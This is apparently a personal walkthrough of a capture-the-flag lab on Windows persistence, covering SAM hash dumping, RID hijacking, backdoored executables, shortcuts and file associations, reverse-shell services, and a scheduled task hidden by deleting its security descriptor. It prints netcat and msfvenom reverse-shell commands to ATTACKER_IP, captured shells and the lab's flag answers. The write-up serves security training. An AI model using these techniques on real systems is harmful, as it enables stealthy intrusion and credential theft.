<span class="highlight" style="color: #B5B0B0; background-color: #080808">Learn the most common persistence techniques used on Windows machines</span>

#activedirectory 

Task 1 - Introduction
------------------------------------

After gaining a first foothold (or any additional footholds) it's important we establish some kind of persistence so that we can get back in easily.  This way we don't have to go through an try and exploit the machine again.

There's a lot of reasons for this like:

-   **Re-exploitation isn't always possible**: Some unstable exploits might kill the vulnerable process during exploitation, getting you a single shot at some of them.
-   **Gaining a foothold is hard to reproduce**: For example, if you used a phishing campaign to get your first access, repeating it to regain access to a host is simply too much work. Your second campaign might also not be as effective, leaving you with no access to the network.
-   **The blue team is after you**: Any vulnerability used to gain your first access might be patched if your actions get detected. You are in a race against the clock!

It would be nice to have some administrator's password hash but eventually that will probably get rotated.  Anyway, there are sneakier way to regain access to a compromised machine, making life harder for the blue team.

In this room we will look at ways to established persistence in Windows systems. 

__Questions__

Click and continue learning!
Answer: _None Needed_


Task 2 - Tampering with Underprivileged Accounts
--------------------------------------------------------------------------------

It might be easiest to just use some Administrator credentials to get back in, but to make it harder for blue teams to spot us, it's better to manipulate some underprivileged accounts. These won't be scrutinized or monitored as much.

Start the machine:
Username: <span class="highlight" style="color: blue; background-color: #072742">Administrator</span>
Password:  <span class="highlight" style="color: blue; background-color: #072742">Password321</span>

You can connect using the in-browser app, or via RDP client.

### Assign Group Memberships

For this task we assume we have password hashes for some underprivileged users that we have cracked.

The direct way to make an underprivileged user gain admin rights is to add it to the Administrator group:

```shell
C:\> net localgroup administrators thmuser0 /add
```

This will allow you to access the server via RDP, WinRM, or other remote administration service available.

This method may look suspicious so we can also use the Backup Operators group. These users won't have direct Admin rights, but will have access to read/write any file or registry key on the system, ignoring configured DACLs.  This way we can copy the SAM and SYSTEM registry hives, which we can use to recover hashes for all users, enabling us to escalate to any admin account trivially.

First add ourselves to the Backup Operators group:

```shell
C:\> net localgroup "Backup Operators" thmuser1 /add
```

Note, here is some quick help on net localgroup:
```shell
C:\>net localgroup
Aliases for \\techblogger-pc
----------------------------------------------------------------------------
*Administrators
*Backup Operators
*Debugger Users
*Guests
*Network Configuration Operators
*Power Users
*Remote Desktop Users
*Replicator
*Users
The command completed successfully.

# list members of a group
net localgroup groupName

# list all groups a user is a member of
net user userName

# domain style
net user /domain username | find “Group Name”
```

Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the **Remote Desktop Users** (RDP) or **Remote Management Users** (WinRM) groups. We'll use WinRM for this task:

```shell
C:\> net localgroup "Remote Management Users" thmuser1 /add
```

Now let's connect back in with WinRM using the credential:

Username: <span class="highlight" style="color: blue; background-color: #072742">thmuser1</span>
Password:  <span class="highlight" style="color: blue; background-color: #072742">Password321</span>


If you tried to connect right now from your attacker machine, you'd be surprised to see that even if you are on the Backups Operators group, you wouldn't be able to access all files as expected. A quick check on our assigned groups would indicate that we are a part of Backup Operators, but the group is disabled:

```shell
user@AttackBox$ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321

*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

This is due to User Account Control (UAC). One of the features implemented by UAC, **LocalAccountTokenFilterPolicy**, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a graphical user session (Read more on UAC [here](https://tryhackme.com/room/windowsfundamentals1xbx)), if you are using WinRM, you are confined to a limited access token with no administrative privileges.

To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:

```shell
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Once all of this has been set up, we are ready to use our backdoor user. First, let's establish a WinRM connection and check that the Backup Operators group is enabled for our user:
```shell
user@AttackBox$ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
        
*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```

We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:

```shell
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!
```

**Note:** If Evil-WinRM takes too long to download the files, feel free to use any other transfer method.

With those files, we can dump the password hashes for all users using `secretsdump.py` or other similar tools:

```shell
user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x41325422ca00e6552bb6508215d8b426
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9657e898170eb98b25861ef9cafe5bd6:::
thmuser1:1011:aad3b435b51404eeaad3b435b51404ee:e41fd391af74400faa4ff75868c93cce:::
[*] Cleaning up...
```

And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:


**Note:**  Using the Administrator console gained through the thmuser1, execute `C:\flags\flag1.exe` to retrieve your flag.

### Special Privileges and Security Descriptors

A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. **Privileges** are simply the capacity to do a task on the system itself. They include simple things like having the capabilities to shut down the server up to very privileged operations like being able to take ownership of any file on the system. A complete list of available privileges can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) for reference.

In the case of the Backup Operators group, it has the following two privileges assigned by default:

-   **SeBackupPrivilege:** The user can read any file in the system, ignoring any DACL in place.
-   **SeRestorePrivilege:** The user can write any file in the system, ignoring any DACL in place.

We can assign such privileges to any user, independent of their group memberships. To do so, we can use the `secedit` command. First, we will export the current configuration to a temporary file:

```powershell
secedit /export /cfg config.inf
```

We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:

![[windowslocalpersist-1.png]]

We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system:

```powershell
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

You should now have a user with equivalent privileges to any Backup Operator. The user still can't log into the system via WinRM, so let's do something about it. Instead of adding the user to the Remote Management Users group, we'll change the security descriptor associated with the WinRM service to allow thmuser2 to connect. Think of a **security descriptor** as an ACL but applied to other system facilities.

To open the configuration window for WinRM's security descriptor, you can use the following command in Powershell (you'll need to use the GUI session for this):

```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM:

![[windowslocalpersist-2.png]]

Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.

Notice that for this user to work with the given privileges fully, you'd have to change the **LocalAccountTokenFilterPolicy** registry key, but we've done this already to get the previous flag.

If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!

```shell
C:\> net user thmuser2
User name                    thmuser2

Local Group Memberships      *Users
Global Group memberships     *None
```

Once again, we'll assume we have already dumped the credentials on the server and have thmuser2's password. Let's connect with its credentials using WinRM:

Username: <span class="highlight" style="color: blue; background-color: #072742">thmuser2</span>
Password:  <span class="highlight" style="color: blue; background-color: #072742">Password321</span>

We can log in with those credentials to obtain the flag.

**NOTE:** Log in to the machine via WinRM using thmuser2 and execute `C:\flags\flag2.exe` to retrieve your flag.

### RID Hijacking

Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.

When a user is created, an identifier called **Relative ID (RID)** is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.

In any Windows system, the default Administrator account is assigned the **RID = 500**, and regular users usually have **RID >= 1000**.

To find the assigned RIDs for any user, you can use the following command:

```shell
C:\> wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
```

The RID is the last bit of the SID (1010 for thmuser3 and 500 for Administrator). The SID is an identifier that allows the operating system to identify a user across a domain, but we won't mind too much about the rest of it for this task.

Now we only have to assign the RID=500 to thmuser3. To do so, we need to access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use psexec, available in `C:\tools\pstools` in your machine:

```shell
C:\tools\pstools> PsExec64.exe -i -s regedit
```

From Regedit, we will go to `HKLM\SAM\SAM\Domains\Account\Users\` where there will be a key for each user in the machine. Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2). Under the corresponding key, there will be a value called **F**, which holds the user's effective RID at position 0x30:

![[windowslocalpersist-3.png]]

Notice the RID is stored using little-endian notation, so its bytes appear reversed.

We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):

![[windowslocalpersist-4.png]]

The next time thmuser3 logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.

For this task, we assume you have already compromised the system and obtained the password for thmuser3. For your convenience, the user can connect via RDP with the following credentials:

Username: <span class="highlight" style="color: blue; background-color: #072742">thmuser3</span>
Password:  <span class="highlight" style="color: blue; background-color: #072742">Password321</span>

If you did everything correctly, you should be logged in to the Administrator's desktop. 

  
Note: When you log in via RDP, the existing in-browser view will be disconnected. After you terminate your RDP session you can get the in-browser view back by pressing Reconnect.

**Note:** Log in to the machine via RDP using thmuser3 and execute `C:\flags\flag3.exe` to retrieve your flag.

__Questions__
Insert flag1 here

```shell
kali@kali  ~  evil-winrm -i 10.10.173.95 -u Administrator -H f3118544a831e728781d780cfdb9c1fa

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                       

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                         

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
wpersistence\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> C:\flags\flag1.exe
THM{FLAG_BACKED_UP!}
```
Answer: _THM{FLAG_BACKED_UP!}_

Insert flag2 here
```shell
 kali@kali  ~  evil-winrm -i 10.10.173.95 -u thmuser2 -p Password321

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                       

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                         

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\thmuser2\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
*Evil-WinRM* PS C:\Users\thmuser2\Documents> net user thmuser2
User name                    thmuser2
Full Name                    thmuser2
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/28/2022 11:48:03 PM
Password expires             Never
Password changeable          5/28/2022 11:48:03 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/6/2023 12:26:25 AM

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.

*Evil-WinRM* PS C:\Users\thmuser2\Documents> c:\flags\flag2.exe
THM{IM_JUST_A_NORMAL_USER}
```
Answer: _THM{IM_JUST_A_NORMAL_USER}_

Insert flag3 here
For this flag, after making the changes with the regeditor, you can login with RDP this time instead of EvilWinRM.
```bash
xfreerdp /u:thmuser3 /p:Password321 /v:10.10.173.95
```

Then you should get administrator access since you re-assigned the 'F4   01' flags  (500 = 0x01F4  written backward) 500 is for admin, on your user.

![[windowslocalpersist-5.jpg]]
Answer: _THM{TRUST_ME_IM_AN_ADMIN}_


Task 3 - Backdooring Files
---------------------------------------------

Another trick to establishing persistence on a host is by tampering with some files users interact with daily. By modifying these files, we can put backdoors in that will get executed whenever a user accesses them.  So we don't raise any eyebrows or redflags, we need to modify the files in a way to keep them working normally. 

### Executable Files

If you see any files on the desktop, there's a good chance that they will be used regularly.  For example there maybe a shortcut on an Administrator's desktop which points to `C:\Program Files\PuTTY\putty.exe`.  We can check the properties of the shortcut to find the real path. 

If we download the executable to our box, we can use a tool like msfvenom to modify the binary to silently backdoor it in such a way as to keep it running normally. Here is the basic syntax:

```shell
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting .exe we  can re-upload to the victim's PC, and the next time it's run, it will open a reverse_tcp meterpreter payload without the user noticing it.  While this method is good to establish persistence, let's examine other sneakier techniques.

### Shortcut Files

If we don't want to or can't alter an executable file, then we can always tamper with the shortcut file itself.  Instead of it pointing to a real executable, we could have it point to a script which will do what we wish.

If we do an example with calc.exe (the Windows Calculator) which is found on our victim's desktop:

![[windowslocalpersist-6.png]]

Before we can hijack this shortcut, let's make a small PowerShell script somewhere like `C:\Windows\Systemm32` or any other sneaky location, containing the following:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

When this script is executed, it will open a reverse shell and immediately open the calculator. 

Finally, we will point the shortcut at our new script. Be careful to point the shortcut icon back to the original executable so that no visible changes appear to alarm the user. We also want to run our script in a hidden window, for which we will add the `-windowstlye hidden` option to PowerShell. The final target of the shortcut would be:

```powershell
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

![[windowslocalpersist-7.png]]

No remember, for these persistence techniques to work, we'll need to have a listener running to catch the reverse shell at all times.  You may be cautioned that doing so without some controls as to who can access this port can also cause you some security issues. You should add some iptables/ACLs to restrict access to this port to whatever subnet range you are exepecting to connect.

```shell
$ nc -lnvp 4445
```

If you now double-click on the shortcut, you will get a reverse shell back to your attack machine. Meanwhile, the user will just appear to launch the calculator as expected.  You may also notice that a brief flash of a command prompt will flash on the screen when running the background script. Hopefully the user won't notice that.

**Note:** Execute `C:\flags\flag5.exe` from your reverse shell to get your flag!

### Hijacking File Associations

In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.

The default operating system file associations are kept inside the registry, where a key is stored for every single file type under `HKLM\Software\Classes\`. Let's say we want to check which program is used to open .txt files; we can just go and check for the `.txt` subkey and find which **Programmatic ID (ProgID)** is associated with it. A ProgID is simply an identifier to a program installed on the system. For .txt files, we will have the following ProgID:

![[windowslocalpersist-9.png]]

We can then search for a subkey for the corresponding ProgID (also under `HKLM\Software\Classes\`), in this case, `txtfile`, where we will find a reference to the program in charge of handling .txt files. Most ProgID entries will have a subkey under `shell\open\command` where the default command to be run for files with that extension is specified:

![[windowslocalpersist-10.png]]

In this case, when you try to open a .txt file, the system will execute `%SystemRoot%\system32\NOTEPAD.EXE %1`, where `%1` represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it to `C:\Windows\backdoor2.ps1`:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Notice how in Powershell, we have to pass `$args[0]` to notepad, as it will contain the name of the file to be opened, as given through `%1`.

Now let's change the registry key to run our backdoor script in a hidden window:

![[windowslocalpersist-11.png]]

Finally, create a listener for your reverse shell and try to open any .txt file on the victim machine (create one if needed). You should receive a reverse shell with the privileges of the user opening the file.

**Note:** Once you have backdoored the .txt file handler and spawned a reverse shell, run `C:\flags\flag6.exe` to get a flag!

__Questions__


![[windowslocalpersist-8.jpg]]
Insert flag5 here:

Answer: _THM{NO_SHORTCUTS_IN_LIFE}_


Insert flag6 here:![[windowslocalpersist-12 1.jpg]]

Answer: _THM{TXT_FILES_WOULD_NEVER_HURT_YOU}_



Task 4 - Abusing Services
----------------------------------------------

Windows Services is a great way to establish persistence since they are running in the background.  These services can be setup to automatically start whenever the Windows machine starts up, giving us persistence each time the machine is started.

A service is just a normal executable, but configured to run headless with certain options to run it in the background to perform tasks.

There are a few ways we can abuse these services. We can create a new one or modify an existing one.

### Creating Backdoor Services

We can create a service named "THMservice" like this:

```shell
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

**Note:** There must be a space after each equal sign for the command to work.

The "net user" command will be executed when the service is started, resetting the Administrator's password to `Passwd123`. Notice how the service has been set to start automatically (start= auto), so that it runs without requiring user interaction.

Resetting the Administrator password works well enough, but it would probably soon be noticed. It is better to use something like msfvenom to create a payload and then start that with the service. We can create a reverse shell using msfvenom like this:

```shell
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o rev-svc.exe
```

You can then copy the executable to your target system, say in `C:\Windows` and point the service's binPath to it:

```shell
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

then we just start a listener:

```shell
nc -lnvp 4444
```

And we should catch our new shell whenever this service is executed.

**NOTE:** Use the reverse shell you just gained to execute `C:\flags\flag7.exe`

### Modifying Existing Services

While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. We may want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.

You can get a list of available services using the following command:

```shell
C:\> sc.exe query state=all
SERVICE_NAME: THMService1
DISPLAY_NAME: THMService1
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

You should be able to find a stopped service called THMService3. To query the service's configuration, you can use the following command:

```shell
C:\> sc.exe qc THMService3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2 AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\THMService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMService3
        DEPENDENCIES       : 
        SERVICE_START_NAME : NT AUTHORITY\Local Service
```

There are three things we care about when using a service for persistence:

-   The executable (**BINARY_PATH_NAME**) should point to our payload.
-   The service **START_TYPE** should be automatic so that the payload runs without user interaction.
-   The **SERVICE_START_NAME**, which is the account under which the service will run, should preferably be set to **LocalSystem** to gain SYSTEM privileges.

Let's start by creating a new reverse shell with msfvenom:

```shell
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc2.exe
```

To reconfigure "THMservice3" parameters, we can use the following command:

```shell
C:\> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

You can then query the service's configuration again to check if all went as expected:

```shell
C:\> sc.exe qc THMservice3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

**NOTE:** Start a Metasploit listener on your attacker's machine and manually start the service to receive a reverse shell. From there, run `C:\flags\flag8.exe` to get a flag!

__Questions__

To answer this question, we will need to generate a payload on our local attackbox with msfvenom, upload it to the Windows machine, setup a new service to run it, and then catch it with Meterpreter on our local attackbox.

First step, generate the payload on our local Kali:
```shell
kali@kali  ~/pentesting/tryhackme.com/windowslocalperist  msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe-service -o rev-svc.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc.exe
 kali@kali  ~/pentesting/tryhackme.com/windowslocalperist  ls
rev-svc.exe  sam.bak  system.bak
```

Now we will host it on a simple Python webserver:
```shell
 kali@kali  ~/pentesting/tryhackme.com/windowslocalperist  python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.169.58 - - [08/Feb/2023 08:22:07] "GET /rev-svc.exe HTTP/1.1" 200 -
```

Setup a listener in Meterpreter to catch the shell before we start the service:
```shell
 kali@kali  ~  msfconsole -q 
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set  windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp

msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on tun0:4444 
```

Now let's copy the exploit service over to our windows victim:
![[windowslocalpersist-12 1.jpg]]


**NOTE:** If you use -URL in your invoke-webrequest command like I ALWAYS do, then you will see the error in red above. Just change that with -URI (I as in Indiana)


Setup the new Service and start it:
![[windowslocalpersist-13.jpg]]


Catch the Shell:
```shell
[*] Command shell session 2 opened (tun0:4444 -> 10.10.169.58:49789) at 2023-02-08 08:31:06 +0900


Shell Banner:
Microsoft Windows [Version 10.0.17763.1821]
-----
```

Great we have a shell, let's get the flag:
```
C:\Windows\system32>C:\flags\flag7.exe
C:\flags\flag7.exe
THM{SUSPICIOUS_SERVICES}
```
Insert flag7 here:
Answer: _THM{SUSPICIOUS_SERVICES}_

For the last flag here we will modify an existing service. There is a THMService3. We can query it like this:
![[windowslocalpersist-14.jpg]]

Let's generate a new payload with msfvenom:
```shell
 kali@kali  ~/pentesting/tryhackme.com/windowslocalperist  msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4448 -f exe-service -o rev-svc2.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc2.exe
```

Now we start a local webserver with python to host it:
```shell
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now we can pull the exe over to Windows:
![[windowslocalpersist-15.jpg]]

Now we can start our Meterpreter listener on our local Kali box:
```shell
 kali@kali  ~  msfconsole -q 
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 4448
lport => 4448
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on tun0:4448 
```

Now we can reconfigure the service on the Windows host:
![[windowslocalpersist-16.jpg]]

Then we can Start the service:
![[windowslocalpersist-17.jpg]]

And we catch our reverse shell back in Meterpreter:
```shell
[*] Command shell session 1 opened (tun0:4448 -> 10.10.169.58:49969) at 2023-02-08 09:09:30 +0900


Shell Banner:
Microsoft Windows [Version 10.0.17763.1821]
-----
```

Now we can get the flag:
```shell
C:\Windows\system32>C:\flags\flag8.exe
C:\flags\flag8.exe
THM{IN_PLAIN_SIGHT}
```

Insert flag8 here:
Answer: _THM{IN_PLAIN_SIGHT}_

Task 5 - Abusing Scheduled Tasks
---------------------------------------------------------

In this task we will look at how to abuse task scheduling to establish persistence.

### Task Scheduler

The most common way to accomplish this is the built-in Windows Task Scheduler.  This tool let's you schedule tasks at specific times, periodically, or when a certain event occurs. You can use `schtasks` to use it. A complete reference for the command can be found on [Microsoft's website](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks).

Here is an example of how to schedule a task to run a backdoor once a minute. In real life you wouldn't want to be this noisy but this is just for demonstration so we don't have to wait.

```shell
C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
```

**Note:** Be sure to use `THM-TaskBackdoor` as the name of your task, or you won't get the flag.

This will:
* Create a task named "THM-TaskBackdoor"
* Execute a reverse shell back to the attacker using `nc64.exe`
* Use the `/sc minute` and `/mo 1` options to run every minute
* Use the `/ru SYSTEM` option to run with SYSTEM priveleges.

You can see if it was successful with this command:
```shell
C:\> schtasks /query /tn thm-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready
```

### Making Our Task Invisible

If we have a computer savy person checking, they might notice our scheduled task. Depending on the situation, we may want to hide it.

One way to do this is to delete it's Security Descriptor (SD). This is basically an ACL which lists which users can view/add/edit tasks.  If we delete this SD, then it would effectively dis-allow all users, including the Administrators, from viewing them.

The security descriptors of all scheduled tasks are stored in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. You will find a registry key for every task, under which a value named "SD" contains the security descriptor. You can only erase the value if you hold SYSTEM privileges.

To hide our task, let's delete the SD value for the "THM-TaskBackdoor" task we created before. To do so, we will use `psexec` (available in `C:\tools`) to open Regedit with SYSTEM privileges:

```shell
C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
```

We will then delete the security descriptor for our task:
![[windowslocalpersist-18.png]]

If we try to query our service again, the system will tell us there is no such task:

```shell
C:\> schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.
```

If we start an nc listener in our attacker's machine, we should get a shell back after a minute:

```shell
user@AttackBox$ nc -lvp 4449
```

**NOTE:** Use the reverse shell obtained through the task scheduler and execute `C:\flags\flag9.exe` to retrieve a flag.

First let's start a listener since this is netcat and the scheduler can run after any min:
```shell
 kali@kali  ~  nc -nlvp 4444
listening on [any] 4444 ...
```

Next we can create our scheduled task:
![[windowslocalpersist-24.jpg]]

We get our callback and we are logged in:
```shell
connect to [tun0] from (UNKNOWN) [10.10.68.133] 49697
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.


C:\Windows\system32>
```

